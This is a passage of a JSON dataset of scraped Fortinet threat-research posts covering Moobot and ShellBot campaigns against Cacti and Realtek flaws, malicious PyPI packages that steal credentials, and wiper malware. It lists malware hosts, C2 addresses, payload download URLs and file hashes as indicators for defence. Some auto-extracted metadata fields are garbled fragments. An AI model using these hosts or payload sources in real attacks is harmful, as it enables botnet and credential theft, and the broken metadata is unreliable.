          "11ddebd9b22a3a21be11908feda0ea1e1aa97bc67b2dfefe766fcea467367394",
          "4daca38854ba0a471d25250f106122ff81b8bbda2b19569a9e0b6e7f56187746",
          "33c5b4c9a6c24729bb10165e34ae1cd2315cfce5763e65167bd58a57fde9a389",
          "c2aa5d89d1fb63c65806a789f529daf774ceff411338c43438ea6c0175e10fd0"
        ],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 1.2529738302934181
    }
  },
  {
    "id": "Fortinet_5873",
    "source": "Fortinet",
    "title": "Moobot Strikes Again - Targeting Cacti And RealTek Vulnerabilities",
    "text": "FortiGuard Labs Threat Research Affected platforms:Windows, LinuxImpacted parties:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity level:Critical FortiGuard Labs observed several attacking bursts targeting Cacti and Realtek vulnerabilities in January and March of this year and then spreading ShellBot and Moobot malware. (Figure 1 shows trigger counts from our IPS signatures of the CVE-2021-35394 (Realtek) and CVE-2022-46169 (Cacti) vulnerabilities.) ShellBot is a malware developed in Perl that uses the Internet Relay Chat (IRC) protocol to communicate with the server, also known as PerlBot. Moobot is a Mirai variant botnet that targets exposed networking devices. We discovered that it had attackedHikvision products in 2021. Compromised endpoints can be controlled by its C&C server and deliver further attacks, such as distributed denial-of-service attacks. This article will examine the payloads of these two attacks and their resulting malware behavior. CVE-2021-35394 is an arbitrary command injection vulnerability that affects UDPServer due to insufficient legality detection on commands received fromclients. The complete payloads are shown in Figure 2. CVE-2022-46169 is a command injection vulnerability that allows an unauthenticated user to execute arbitrary code on a server running Cacti. The vulnerability resides in the “remote_agent.php” file, which can be accessed without authentication. The Moobot payload is shown in Figure 3, and the ShellBot payload is in Figure 4. The script file to further download Moobot is shown below. It executes the Moobot with the parameterrealtek.<Filename>. Analyzing the MIPS version (SHA256: 455314A186B4A9A1788E2ACB85A9B6B34FB0A7700D0DECC6DE056030FEA543DF), we can identify Moobot from the specific seed \"w5q6he3dbrsgmclkiu4to18npavj702f\" for generating random strings in Figure 6. Like most Mirai variants, it has an encrypted data section with a botnet configuration. The encryption key “0xDEADBEEF “ is shown in Figure 7. Once executed, it prints “listening to tun0” to the console and then starts communicating with the C2 host “troon[.]dns[.]army” with the heartbeat message “0x336699”. The traffic capture is shown in Figure 8. Once it receives the command from the C2 server, it starts its attack. Moobot includes the following process names of known bots and uses the command “kill -9” to ensure it’s the only one running in the infected device: dvrHelper, Ni**eR69xd, 1337SoraLOADER, Ni**eRd0nks1337, X19I239124UIU, IuYgujeIqn, 14Fa, ccAD, BOGOMIPS, /etc/rc.d/rc.local, g1abc4dmo35hnp2lie0kjf, /dev/FTWDT101_watchdog, /dev/netslink/, PRIVMSG, GETLOCALIP, KILLATTK, Eats8, v[0v, 93OfjHZ2z, GhostWuzHere666, WsGA4@F6F, ACDB, AbAd, iaGv ShellBot’s activity began in January and primarily targeted Cacti vulnerability. We collected three ShellBot variants in our traffic capture system. The first is “PowerBots (C) GohacK” from http[:]//80[.]68[.]196[.]6/ff, and the configuration is shown in Figure 9. Its C2 is “49[.]212[.]234[.]206:3303”, and the bot’s process masquerades as “/usr/sbin/sshd” to evade detection. After the communication channel setup, the client waits for a command from the server. There are six commands, shown below: The second variant is “LiGhT's Modded perlbot v2” from 85[.]239[.]33[.]32. It downloads the files “ce” and “plm”. Each has a slightly different configuration, as shown in Figure 10. The C2 host is “juice[.]baselinux[.]net”, and the process name is “/usr/sbin/mysql”. The traffic capture is shown in Figure 11. The server was created in March 2023, and hundreds of victims are already in this channel. The commands used in perlbot are listed below. It includes numerous types of flooding attacks and hacking functions. It also includes an exploit enhancement module that gets news from a public website offering exploits and security advisories. The third variant is “B0tchZ 0.2a” from 46[.]101[.]183[.]162/.xx/web. The malicious website is shown in Figure 12. All files on this website are IRC botnets that use the same C2 server, 198[.]98[.]61[.]106:8080. The configuration from the payload that targets vulnerable Cacti servers is shown in Figure 13. The file is written in Portuguese, and the command list is below: Over the past few months, threat actors have been spreading ShellBot and Moobot malware on exploitable servers. Compromised victims can be controlled and used as DDoS bots after receiving a command from a C2 server. Because Moobot can kill other botnet processes and also deploy brute force attacks, administrators should use strong passwords and change them periodically. Moreover, some of the ShellBot variants can install other malware from their C2 server. The vulnerabilities mentioned above have a critical security impact that can lead to remote code execution. Therefore, it is highly recommended that patches and updates be applied as soon as possible. This malware is detected and blocked by FortiGuard Antivirus as: Perl/IRCBot. I!tr ELF/Moobot. A!tr BASH/Agent. A!tr.dldr The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR, and the Fortinet AntiVirus engine is a part of each of those solutions. Customers running current AntiVirus updates are protected. Fortinet has released IPS signatures to proactively protect our customers from the threats contained in the exploit list. The FortiGuard Web Filtering Service blocks the C2 server. FortiGuard IP Reputation and Anti-Botnet Security Service proactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. Malware Host: 104[.]244[.]76[.]105 156[.]224[.]24[.]249 206[.]217[.]205[.]24 199[.]195[.]250[.]172 80[.]68[.]196[.]6 85[.]239[.]33[.]32 46[.]101[.]183[.]162 49[.]212[.]234[.]206:3303 198[.]98[.]61[.]106:8080 juice[.]baselinux[.]net:6667 apid[.]mutoujs[.]xyz troon[.]dns[.]army botnet[.]goelites[.]cc j[.]xnyidc[.]top www[.]xiaojue[.]cyou bot[.]layer7[.]top Files - Moobot: bc1ded2f3a9fc50614a159b3971a26868e6a5b09a6f6ba65d6bee1b05335e69b 55048b3df95d4dbb681be32cfe6c9e4a128045917c49da9ff1c30723debc1854 661f0fb1cf928c40333eaefc86522ddc74c7b96a8e32b93ed8153b8244d66721 d3b13f71e7637d7118ac3e170d33b3bbb15814357e21fa3318b4bf7ecbe6dc7b 0d4be7af347f2cb80dcd71cd94f1f39a6f3dbe71765d824bb0d66c11b8759cd7 e2075d6b723d7daf2303af31e3970ed79d435e52b4338ee63499c4644332ea10 3dbea4436ef3e00dcfb73608164e3d1ded9434f8ee1679cd3a790e22c91cbe11 455314a186b4a9a1788e2acb85a9b6b34fb0a7700d0decc6de056030fea543df cd47c9db5e3ec59221361ca7459bb12a5a84014c1f8aa2e2bdad07ccb37a4e29 9144c4768b457fb5384bc807d9e992671c25dbefe9d2781672c018e1b4d8c36a 979bf642f67d5df2e8fa664c0bdecbc2954c9ced44f47122c71ad5f71a52aa0d e2ff90f5bdf51da577be88266cc9dc8be48f1776af46949dcdd2d54e4c84449f 0cb77fabcef38d5ec4e1e64945bac8c33ea8e97346a3140e67ec30eecedc9ea0 0cd6a246eb6933bf5ac8639d8972e2c80dcdb7723a15435a914cf6b5bd30af4c cf1b136558e7b5faf6bfce3b460afed06e613ca6747257273571399d106dea2b 175b536d5c825b78bd2567b836bb18046928f33f7ae1865afb66a4fe064ebb81 cdf1c2610bde8ae870bc083d06fb00ba1c3441c075fc6c26e9cc9f93c9a3703f 903c340da7c6ef32b2e3098389748fc5d94e88e61bfeea8a67313327f021fb9f 33aa8e731eca7ba051626845541f91fad6f69862aa1deaea7b80a15dae8d67bf f473597e5fda9051522a52c78965d0eb050ff2971cfce8d359618e1c136ad77b de5e60ab541838c4c3cb0bfd0733417f2fe4a19bac08683391022cdaabe263de 565d09c8fc9f712b82eae45a39029ac996904564cc08dae6306678081087e933 c33c66e7a161718da4535b34078edb04600c5a06eb1e05fe514a5ad5ac149594 e356ba8fe6ae21fbbba785ade3220a666e3fae947c68093e05b01f0c3f98e15f 7e4dadf93fbb7a01b55eadacbb40ae8d5e95f5b9592e55f0fb2340d89fc78f17 ae2c71e3e177721c336f76946d24b95512accf677c87e829a31b315d56624df3 e1366976365db1f2bffdc37d4e64e12f883f9a20e02b12d52b6a1b346b8f0692 abb3d04a081ee199cfb5687361fbbca3fa2012f588832e05de0e21874f162afd 5f0f2b2e3e839e50631b89cc2e9d980b337db417cab51f21beb0a56043297a6f 7d2c0cba18d51ed84e7a888d56dbcb5e73c1d076ed5f8e5db2528f826601b2cc 9a067e32dd6c25053c302de7caf61cdc0f3982289eb91d06c449fe08a47fc6d3 6804cebbf837d7c5559519c364cc0b20c4f9b514c74039321bc69bcfdbfb5e93 947675c8b2a65bf9b38f4d3d15d108e0826f570086c6a758d3e02be9315da1cd Files - ShellBot c05cf5b2c94edd15c40db1ce52f97bdc09ec61e78386c8878b15515cbde99528 47ac3a2c51fc64479ceff1e842a414bc11dc59b9dcdbd3dd1bf011e243f91ffa 0c67234ce88958c9319ca9a8f8fdc4b48690136871515324509ac956704f1373 b7d62d1a145ddda241e624ef94ab31fcca1a13f79e130d0a704586e35745282a malware,cacti FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/moobot-strikes-again-targeting-cacti-and-realtek-vulnerabilities",
      "scraped_at": "2025-07-20T13:58:40.360121",
      "indicators": {
        "ip_address": [],
        "domain": [
          "r",
          "c"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "7d2c0cba18d51ed84e7a888d56dbcb5e73c1d076ed5f8e5db2528f826601b2cc",
          "e356ba8fe6ae21fbbba785ade3220a666e3fae947c68093e05b01f0c3f98e15f",
          "e2075d6b723d7daf2303af31e3970ed79d435e52b4338ee63499c4644332ea10",
          "55048b3df95d4dbb681be32cfe6c9e4a128045917c49da9ff1c30723debc1854",
          "c05cf5b2c94edd15c40db1ce52f97bdc09ec61e78386c8878b15515cbde99528",
          "f473597e5fda9051522a52c78965d0eb050ff2971cfce8d359618e1c136ad77b",
          "947675c8b2a65bf9b38f4d3d15d108e0826f570086c6a758d3e02be9315da1cd",
          "d3b13f71e7637d7118ac3e170d33b3bbb15814357e21fa3318b4bf7ecbe6dc7b",
          "6804cebbf837d7c5559519c364cc0b20c4f9b514c74039321bc69bcfdbfb5e93",
          "455314a186b4a9a1788e2acb85a9b6b34fb0a7700d0decc6de056030fea543df",
          "455314A186B4A9A1788E2ACB85A9B6B34FB0A7700D0DECC6DE056030FEA543DF",
          "903c340da7c6ef32b2e3098389748fc5d94e88e61bfeea8a67313327f021fb9f",
          "7e4dadf93fbb7a01b55eadacbb40ae8d5e95f5b9592e55f0fb2340d89fc78f17",
          "abb3d04a081ee199cfb5687361fbbca3fa2012f588832e05de0e21874f162afd",
          "cf1b136558e7b5faf6bfce3b460afed06e613ca6747257273571399d106dea2b",
          "0cb77fabcef38d5ec4e1e64945bac8c33ea8e97346a3140e67ec30eecedc9ea0",
          "0d4be7af347f2cb80dcd71cd94f1f39a6f3dbe71765d824bb0d66c11b8759cd7",
          "bc1ded2f3a9fc50614a159b3971a26868e6a5b09a6f6ba65d6bee1b05335e69b",
          "175b536d5c825b78bd2567b836bb18046928f33f7ae1865afb66a4fe064ebb81",
          "ae2c71e3e177721c336f76946d24b95512accf677c87e829a31b315d56624df3",
          "3dbea4436ef3e00dcfb73608164e3d1ded9434f8ee1679cd3a790e22c91cbe11",
          "e2ff90f5bdf51da577be88266cc9dc8be48f1776af46949dcdd2d54e4c84449f",
          "0c67234ce88958c9319ca9a8f8fdc4b48690136871515324509ac956704f1373",
          "661f0fb1cf928c40333eaefc86522ddc74c7b96a8e32b93ed8153b8244d66721",
          "cd47c9db5e3ec59221361ca7459bb12a5a84014c1f8aa2e2bdad07ccb37a4e29",
          "b7d62d1a145ddda241e624ef94ab31fcca1a13f79e130d0a704586e35745282a",
          "0cd6a246eb6933bf5ac8639d8972e2c80dcdb7723a15435a914cf6b5bd30af4c",
          "e1366976365db1f2bffdc37d4e64e12f883f9a20e02b12d52b6a1b346b8f0692",
          "979bf642f67d5df2e8fa664c0bdecbc2954c9ced44f47122c71ad5f71a52aa0d",
          "9a067e32dd6c25053c302de7caf61cdc0f3982289eb91d06c449fe08a47fc6d3",
          "cdf1c2610bde8ae870bc083d06fb00ba1c3441c075fc6c26e9cc9f93c9a3703f",
          "de5e60ab541838c4c3cb0bfd0733417f2fe4a19bac08683391022cdaabe263de",
          "9144c4768b457fb5384bc807d9e992671c25dbefe9d2781672c018e1b4d8c36a",
          "c33c66e7a161718da4535b34078edb04600c5a06eb1e05fe514a5ad5ac149594",
          "5f0f2b2e3e839e50631b89cc2e9d980b337db417cab51f21beb0a56043297a6f",
          "47ac3a2c51fc64479ceff1e842a414bc11dc59b9dcdbd3dd1bf011e243f91ffa",
          "33aa8e731eca7ba051626845541f91fad6f69862aa1deaea7b80a15dae8d67bf",
          "565d09c8fc9f712b82eae45a39029ac996904564cc08dae6306678081087e933"
        ],
        "cve": [
          "CVE-2021-35394",
          "CVE-2022-46169"
        ],
        "email": [],
        "url": []
      },
      "threat_score": 1.3043478260869568
    }
  },
  {
    "id": "Fortinet_21063",
    "source": "Fortinet",
    "title": "Supply Chain Attack via New Malicious Python Packages",
    "text": "FortiGuard Labs Threat Research By monitoring an open-source ecosystem, the FortiGuard Labs team discovered over 60 zero-day attacks embedded in PyPI packages (Python Package Index) between early February and mid-March of 2023. In this blog, we cover all the packages that were found, grouping them into similar attacks or behaviors. 1. The packages in this set were found to be similar: The setup.py file in these packages tries to run a PowerShell with a command encoded with Base64 that attempts to download a potentially malicious executable and execute it. The encoded command is decoded as follows: 2. This next set of packages includes: The setup.py file in these packages tries to execute a python script written to connect to a URL that may contain malicious code. The contents of the URL resolve to the code we found in set three, below. 3. The third set of packages includes: The setup.py file in these packages tries to steal sensitive information, such as credit cards, wallets, account logins, etc. using a Discord webhook. While the setup.py file for the component judyb-advanced may at first appear different from the others in this set (Figure 5), after being decoded with Base64 it resolves to the code shown in Figure 4. 4. This set of packages includes: The setup.py file in these packages includes the Empyrean stealer code, an open-source code to launch an attack to steal users’ sensitive information. The code in these packages is heavily obfuscated, but we were able to see several techniques, including anti-debug, autorun, and injection methods written in Python. 5. This set of packages includes: The setup.py file in these packages tries to download a zip file to a directory (depending on python version), extract its contents, run a script contained in the zip file, and then remove its directory. 6. The packages in this set include: The setup.py file in these packages tries to download a zip file that contains malicious code, extracts it, and then tries to run it, all while trying to hide it from the user. 7. This set includes the following package: Its setup.py file tries to exfiltrate user information to what looks like a webhook URL. 8. This set includes the following package: Its setup.py file tries to execute heavily obfuscated code. Metadata information of the package gathered from its GitHub link, “https://github.com/Napoleon-x/multi-logger-python-discord-token-logger-and-chrome-password-stealer-through-webhooks”, we get a clue that it may be a password stealer through a Discord webhook. 9. This set includes the following package: Its setup.py file tries to run a potentially malicious python script and then remove it. In this blog, we have reviewed several sets of packages, each with different styles of attacks, that we have gathered over the past month or so. The packages in each set seem to use similar methods of attack. Given the volume and variety of malicious packages we have discovered, Python end users should use caution when downloading packages and double-check them before use. We will continue monitoring new open-source packages and reporting on any malicious packages we find to help prevent users from becoming victims of a supply chain attack. FortiGuard AntiVirus detects the malicious files identified in this report as py-hydraurlstudy-2.37 setup.py:Python/Agent. KAF!tr tptoolpywgui-10.56 setup.py:Python/Agent. KAF!tr libgetrandram-7.78 setup.py:Python/Agent. KAF!tr esqultraultrapong-7.37 setup.py:Python/Agent. KAF!tr esqhackedLGTBpip-5.4 setup.py:Python/Agent. KAF!tr tppyrandomed-4.33 setup.py:Python/Agent. KAF!tr esqpepintpyw-3.40 setup.py:Python/Agent. KAF!tr py-proofnvidiavm-7.87 setup.py:Python/Agent. KAF!tr selfvisapostosint-1.16 setup.py:Python/Agent. KAF!tr esqhttpguicc-2.76 setup.py:Python/Agent. KAF!tr esqcpupipkill-9.35 setup.py:Python/Agent. KAF!tr py-ultrageturl-4.17 setup.py:Python/Agent. KAF!tr esqpeprandpaypal-5.38 setup.py:Python/Agent. KAF!tr esqhttppywinfo-8.86 setup.py:Python/Agent. KAF!tr tppyLGTBnvidia-3.11 setup.py:Python/Agent. KAF!tr selfpostmcintel-10.27 setup.py:Python/Agent. KAF!tr esqrerecandy-2.70 setup.py:Python/Agent. KAF!tr esqpaypalnvidiaurl-4.73 setup.py:Python/Agent. KAF!tr librereplacereplace-8.23 setup.py:Python/Agent. KAF!tr selfhackedrandomstudy-4.59 setup.py:Python/Agent. KAF!tr selfhackedrandomstudy-5.55 setup.py:Python/Agent. KAF!tr libvirtualsplitstring-2.35 setup.py:Python/Agent. KAF!tr py-infohydrarandom-1.57 setup.py:Python/Agent. KAF!tr esqproofpongint-4.27 setup.py:Python/Agent. KAF!tr selfccvirtualgame-6.70 setup.py:Python/Agent. KAF!tr tpintelpullcpu-9.31 setup.py:Python/Agent. KAF!tr selflibmineload-5.34 setup.py:Python/Agent. KAF!tr esqsplitpushpush-7.71 setup.py:Python/Agent. KAF!tr selfproofstudyrand-1.59 setup.py:Python/Agent. KAF!tr libcontrolverLGTB-5.50 setup.py:Python/Agent. KAF!tr esqgameloadrandom-4.81 setup.py:Python/Agent. KAF!tr selfpaypalcontrolsuper-5.71 setup.py:Python/Agent. KAF!tr libpipinfoad-10.35 setup.py:Python/Agent. KAF!tr libpywstrvm-7.15 setup.py:Python/Agent. KAF!tr selfhydrastudycc-2.15 setup.py:Python/Agent. KAF!tr tpstringcraftget-6.42 setup.py:Python/Agent. KAF!tr esqlibkillstr-10.27 setup.py:Python/Agent. KAF!tr selfrandompullver-1.9 setup.py:Python/Agent. KAF!tr tpreloadad-1.68 setup.py:Python/Agent. KAF!tr selfinturlstudy-2.23 setup.py:Python/Agent. KAF!tr selfosintgrandrandom-2.67 setup.py:Python/Agent. KAF!tr colorstyle-1.0 setup.py:Python/Agent. KAF!tr snwproxies-1.0 setup.py:Python/Agent. KAF!tr thebypasstool-1.0 setup.py:Python/Agent. KAF!tr judyb-advanced-1.0 setup.py:Python/Agent. KAF!tr telthi-1 setup.py:Python/Agent. KAF!tr pycolouring-0.1.5 setup.py:Python/Agent. KAF!tr pycolouring-0.1.5 code.py:Python/Agent. KAF!tr colourfool-0.1.5 setup.py:Python/Agent. KAF!tr gmgeoip-0.0.2 setup.py:Python/Agent. KAF!tr httpx-advanced3-0.1.0 setup.py:Python/Agent. KAF!tr pycrypterexe-1.0.0 setup.py:Python/Agent. KAF!tr pycrypterexe-1.0.1 setup.py:Python/Agent. KAF!tr pycrypterexe-1.0.2 setup.py:Python/Agent. KAF!tr pycrypterexe-1.0.3 setup.py:Python/Agent. KAF!tr useragentclient-1.0 setup.py:Python/Agent. LK!tr etherapi-1.0 code.py:Python/Agent. LK!tr ligitgays-1.0 setup.py:Python/Agent. LK!tr ligitkidss-1.0 setup.py:Python/Agent. LK!tr tls-python-1.0 setup.py:Python/Agent. LK!tr xboxlivepy-1.0 setup.py:Python/Agent. LK!tr syntax-init-1.0 setup.py:Python/Agent. LK!tr tlsproxies-1.0 setup.py:Python/Agent. EAD2!tr.dldr trc20-unlocker-1.0 setup.py:Python/Agent. DC4D!tr.pws v4pe-5 setup.py:Python/Injector. A4FE!tr v4pe-5 obfuscated.js:JS/Agent. QKA!tr The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Customers running current AntiVirus updates are protected. The FortiGuard Web Filtering Service detects the download URLs cited in this report as Malicious and blocks them. If you believe these or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. py-hydraurlstudy-2.37 setup.py a9963de42759b10941ca69cdd2d1e042 tptoolpywgui-10.56 setup.py fefd35ee35bc1bc95e86d85efd16305a libgetrandram-7.78 setup.py e2ca2b4337f1024e989cfa22c227e299 esqultraultrapong-7.37 setup.py b5eef88865f918414bafb8746270af46 esqhackedLGTBpip-5.4 setup.py 7d94454a11dba12c29f391c6c38da88c tppyrandomed-4.33 setup.py 3674bec2a77700e395ed8362dcd6ba36 esqpepintpyw-3.40 setup.py 8b8efbbe6905992de8b33d9dc025e8a0 py-proofnvidiavm-7.87 setup.py ab431aa32559ae212850dc7c8fba409f selfvisapostosint-1.16 setup.py 4e6aa7bf3c19e1a1efe2919849c2d558 esqhttpguicc-2.76 setup.py ce49e4d8901b4ba5de70346136c32014 esqcpupipkill-9.35 setup.py 84844048aadadabf86024ffa30f7360f py-ultrageturl-4.17 setup.py dcc57259504d3e74a03a706d9f053bfc esqpeprandpaypal-5.38 setup.py d3d31b1d776064a1ae7b5fb7da3e70ed esqhttppywinfo-8.86 setup.py b50cd92b8c7d0292a802db8f44b5e601 tppyLGTBnvidia-3.11 setup.py 066504d4d96e87e03ee4b0a376a52e48 selfpostmcintel-10.27 setup.py 8476f7131e86612e66fbc713f7b9b3b4 esqrerecandy-2.70 setup.py 7198588c88e63dd8b5b9703c4eb60c00 esqpaypalnvidiaurl-4.73 setup.py 16485e4dd28267454ca662b63b75be7c librereplacereplace-8.23 setup.py 775340be445cf019a84c57fdcf2604c selfhackedrandomstudy-4.59 setup.py 7e9c14bfe6319445f0d263841b8cf70b selfhackedrandomstudy-5.55 setup.py 90de1fe8b1f065dc955954f6bf312d62 libvirtualsplitstring-2.35 setup.py 2b0687a1c481640a509ce7318139cd8f py-infohydrarandom-1.57 setup.py 37ddd37dd81c89403db80f9f8a028da1 esqproofpongint-4.27 setup.py 7aaf54b11f718bf58088f0209f24720e selfccvirtualgame-6.70 setup.py 1696d741e7662f308d3e9652a0459f8f tpintelpullcpu-9.31 setup.py 536e633502346758c19001ec8da5bf1d selflibmineload-5.34 setup.py fda5f1b4580bc9a52452a5a48150abcb esqsplitpushpush-7.71 setup.py 7632cb077c1317a5b125f8abb027129d selfproofstudyrand-1.59 setup.py d2b6638b1b1b74efe5743b09b737247b libcontrolverLGTB-5.50 setup.py 4dc485dc9c7e9b93cc5b1e2d9e324fb1 esqgameloadrandom-4.81 setup.py bc46032389f109269a3e6234172c36fa selfpaypalcontrolsuper-5.71 setup.py 463219aa4369ce899d7d8954a38461f1 libpipinfoad-10.35 setup.py 5cdcfa41a9103c7d010fefc8d707e90e libpywstrvm-7.15 setup.py 1ac11dea159ef156efa2ef5e9203ebfa selfhydrastudycc-2.15 setup.py 41c09093ec7fe35dbbf9c6a883a785a7 tpstringcraftget-6.42 setup.py 5fa2cf47fe507a953340910e751c141a esqlibkillstr-10.27 setup.py 1fd6d8fceb580e6533fb4e738cc0649a selfrandompullver-1.9 setup.py 6e00f43c4fd7a823930a1b5b4521eb6a tpreloadad-1.68 setup.py 0c6d69eaa4ef032f12488f69212fe97f selfinturlstudy-2.23 setup.py 7c59a65fac3f66e12021d9c58378a8a9 selfosintgrandrandom-2.67 setup.py 3489759928419c648b64203a7c0774f8 useragentclient-1.0 setup.py 1fc512f11f1a82c21ccf212bb33d47e8 etherapi-1.0 code.py 59b3158f9deb2af0456630651b70728d colorstyle-1.0 setup.py 6cb28f3b3f1e7af941f4488a0f90031f ligitgays-1.0 setup.py 4058792e610d3bffcbbd974f4c1e2684 ligitkidss-1.0 setup.py 5e201a9b6e9ceccf426bd7156a994bd2 tls-python-1.0 setup.py 474314671210b3072fd5fbab0055157c tlsproxies-1.0 setup.py 9ad1e8cbaea7c81f88e642d29b15ead2 xboxlivepy-1.0 setup.py 2e1f58d6bc5a17b0d960cbd2f5c35439 syntax-init-1.0 setup.py 770c30e227785114a0a6bca18369ac79 trc20-unlocker-1.0 setup.py d41bc11f65fa9c685f344203bc119bc8 snwproxies-1.0 setup.py 806a4eb3c5028beb33391655f563f456 thebypasstool-1.0 setup.py 06806a437fffa0dab76ad210dd7f4882 judyb-advanced-1.0 setup.py dc64710af040a0b3d60c1549511b822a v4pe-5 setup.py 5a225ac739236ea5bad546bea3cfa4fe telthi-1 setup.py d2b9ab6be1eba05cc3a2153adf2f42fc v4pe-5 obfuscated.js 499796cf69911760fb01c56b5018b4d3 pycolouring-0.1.5 setup.py 35179043d9dac475e909f738607c37e4 pycolouring-0.1.5 code.py 3694c1e415e8eb8dc42d22dc64b8da45 gmgeoip-0.0.2 setup.py aeb6de64365803f9d880a4e61be84bbb httpx-advanced3-0.1.0 setup.py 54bf5a75397d4bfff31117da99fb9284 pycrypterexe-1.0.0 setup.py 64ed73a23586a8a2b004d417a640cd1e pycrypterexe-1.0.1 setup.py 9f7925c38a63e97a631fb59bc0ac6181 pycrypterexe-1.0.2 setup.py 4e04fb6bf5e9220b89b91140d0463ddd pycrypterexe-1.0.3 setup.py b784f35cdfa84d6c1d75c5b170fc60a0 hxxps://paste[.]bingner[.]com/paste/jr7ow/raw hxxps://raw[.]githubusercontent[.]com/addi00000/empyrean-injection/main/obfuscated[.]js hxxps://cdn[.]discordapp[.]com/attachments/1072676199073062975/1072698468956655726/Game[.]zip zero day vulnerabilities,python Industry Trends FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/supply-chain-attack-via-new-malicious-python-packages",
      "scraped_at": "2025-07-20T13:58:48.155411",
      "indicators": {
        "ip_address": [],
        "domain": [
          "ithub",
          "r",
          "etup",
          "bfuscated",
          "ode"
        ],
        "hash_md5": [
          "dc64710af040a0b3d60c1549511b822a",
          "8476f7131e86612e66fbc713f7b9b3b4",
          "9f7925c38a63e97a631fb59bc0ac6181",
          "e2ca2b4337f1024e989cfa22c227e299",
          "0c6d69eaa4ef032f12488f69212fe97f",
          "7c59a65fac3f66e12021d9c58378a8a9",
          "463219aa4369ce899d7d8954a38461f1",
          "b5eef88865f918414bafb8746270af46",
          "d41bc11f65fa9c685f344203bc119bc8",
          "2e1f58d6bc5a17b0d960cbd2f5c35439",
          "7aaf54b11f718bf58088f0209f24720e",
          "5a225ac739236ea5bad546bea3cfa4fe",
          "1fc512f11f1a82c21ccf212bb33d47e8",
          "bc46032389f109269a3e6234172c36fa",
          "9ad1e8cbaea7c81f88e642d29b15ead2",
          "536e633502346758c19001ec8da5bf1d",
          "6cb28f3b3f1e7af941f4488a0f90031f",
          "dcc57259504d3e74a03a706d9f053bfc",
          "d2b6638b1b1b74efe5743b09b737247b",
          "2b0687a1c481640a509ce7318139cd8f",
          "499796cf69911760fb01c56b5018b4d3",
          "35179043d9dac475e909f738607c37e4",
          "4e6aa7bf3c19e1a1efe2919849c2d558",
          "fda5f1b4580bc9a52452a5a48150abcb",
          "4e04fb6bf5e9220b89b91140d0463ddd",
          "1fd6d8fceb580e6533fb4e738cc0649a",
          "59b3158f9deb2af0456630651b70728d",
          "1ac11dea159ef156efa2ef5e9203ebfa",
          "6e00f43c4fd7a823930a1b5b4521eb6a",
          "7d94454a11dba12c29f391c6c38da88c",
          "3674bec2a77700e395ed8362dcd6ba36",
          "06806a437fffa0dab76ad210dd7f4882",
          "474314671210b3072fd5fbab0055157c",
          "806a4eb3c5028beb33391655f563f456",
          "1696d741e7662f308d3e9652a0459f8f",
          "16485e4dd28267454ca662b63b75be7c",
          "37ddd37dd81c89403db80f9f8a028da1",
          "d2b9ab6be1eba05cc3a2153adf2f42fc",
          "84844048aadadabf86024ffa30f7360f",
          "4dc485dc9c7e9b93cc5b1e2d9e324fb1",
          "7198588c88e63dd8b5b9703c4eb60c00",
          "aeb6de64365803f9d880a4e61be84bbb",
          "7632cb077c1317a5b125f8abb027129d",
          "d3d31b1d776064a1ae7b5fb7da3e70ed",
          "5fa2cf47fe507a953340910e751c141a",
          "a9963de42759b10941ca69cdd2d1e042",
          "90de1fe8b1f065dc955954f6bf312d62",
          "5e201a9b6e9ceccf426bd7156a994bd2",
          "54bf5a75397d4bfff31117da99fb9284",
          "ab431aa32559ae212850dc7c8fba409f",
          "ce49e4d8901b4ba5de70346136c32014",
          "066504d4d96e87e03ee4b0a376a52e48",
          "8b8efbbe6905992de8b33d9dc025e8a0",
          "fefd35ee35bc1bc95e86d85efd16305a",
          "4058792e610d3bffcbbd974f4c1e2684",
          "41c09093ec7fe35dbbf9c6a883a785a7",
          "3489759928419c648b64203a7c0774f8",
          "64ed73a23586a8a2b004d417a640cd1e",
          "b784f35cdfa84d6c1d75c5b170fc60a0",
          "b50cd92b8c7d0292a802db8f44b5e601",
          "770c30e227785114a0a6bca18369ac79",
          "5cdcfa41a9103c7d010fefc8d707e90e",
          "3694c1e415e8eb8dc42d22dc64b8da45",
          "7e9c14bfe6319445f0d263841b8cf70b"
        ],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [],
        "email": [],
        "url": [
          "https://github.com/Napoleon"
        ]
      },
      "threat_score": 1.467065868263473
    }
  },
  {
    "id": "Fortinet_67357",
    "source": "Fortinet",
    "title": "The Latest Intel on Wipers",
    "text": "FortiGuard Labs Threat Research The mass distribution of wiper malware continues to showcase the destructive evolution of cyberattacks. Does the evidence corroborate the theory that the ongoing conflict in Europe is to blame for the rise in wipers? Indeed. Furthermore, given that Russia is the main source of wiper activity, one can anticipate an increase in the use of wipers against countries and organizations that provide aid, weapons, or other logistical support to Ukraine. While both ransomware and wipers increased in the second half of 2022,FortiGuard Labs researchfound it was wipers that really took off. And this trend shows no sign of slowing, which means defenders must take action and prepare now as if they will be targeted. Destructive APT-like wiper malware spread wide in 2022. Data analysis demonstrates a pattern of bad actors persistently deploying destructive attack methods against their targets. It also demonstrates, because the internet has no physical boundaries, how quickly cyber attackers are able to adopt and scale these kinds of attacks – which have been made possible in large part by the Cybercrime-as-a-Service (CaaS) paradigm. Wipers have been around since 2012 and got their name from the goal of the malware: to \"wipe\" the victim's computer files. Up until 2022, wiper activity was few and far between, with maybe one to two new samples cropping up per year. But between the first and second half of 2022, wiper volume saw a substantial increase in volume, and the year ended with a clearly higher uptick. An intriguing distinction in the first half of 2022 was that numerous organizations publicly linked most of the detected wipers—CaddyWiper, WhisperGate, HermeticWiper, etc.—to Russian state-sponsored actors. Furthermore, in the second half, additionally identified wipers were either attributed to pro-Russian hacktivist organizations like Somnia or to 